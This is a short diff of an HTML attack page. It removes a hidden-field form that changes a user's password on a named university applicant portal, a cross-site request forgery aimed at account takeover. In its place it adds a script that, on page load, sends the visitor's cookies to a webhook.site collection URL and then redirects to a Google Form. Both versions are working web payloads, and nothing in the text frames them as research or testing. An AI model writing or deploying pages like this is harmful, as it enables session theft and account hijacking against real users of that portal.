@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form id="changeForm" method="POST" action="https://eportal.iub.edu.pk/applicants/change_password">
-      <input type="hidden" name="password1" value="Secret@5956">
-      <input type="hidden" name="password2" value="Secret@5956">
-      <input type="hidden" name="change_pass" value="1">
-      <button type="submit">Click to Change Password</button>
-    </form>
+    <script>
+      fetch("https://webhook.site/68509bc9-a50f-437b-9460-c6e2ea67061c?cookie=" + encodeURIComponent(document.cookie));
+      setTimeout(() => {
+        window.location.href = "https://forms.gle/YOUR_GOOGLE_FORM_ID";
+      }, 1500);
+    </script>
   </body>
 </html>
-
